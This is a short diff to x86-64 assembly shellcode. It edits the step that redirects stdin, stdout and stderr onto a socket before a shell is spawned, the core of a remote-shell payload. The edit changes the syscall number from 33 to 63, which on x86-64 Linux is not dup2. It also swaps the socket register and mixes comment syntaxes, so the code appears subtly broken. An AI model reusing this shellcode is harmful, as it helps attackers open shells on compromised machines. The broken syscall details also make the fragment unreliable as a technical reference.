@@ -150,19 +150,19 @@ _start:
 	syscall
 
 	; 3 dup2() data steams to socket
-	mov rax, 33
+	mov rax, 63
 	mov rdi, 0 // stdin
-	mov rsi, rbp
+	mov rsi, rbx
 	syscall
 
-	mov rax, 33
+	mov rax, 63
 	mov rdi, 1 // stdout
-	mov rsi, rbp
+	mov rsi, rbx
 	syscall
 
-	mov rax, 33
+	mov rax, 63
 	mov rdi, 2 // stderr
-	mov rsi, rbp
+	mov rsi, rbx
 	syscall
 
 	; spawn shell on host machine
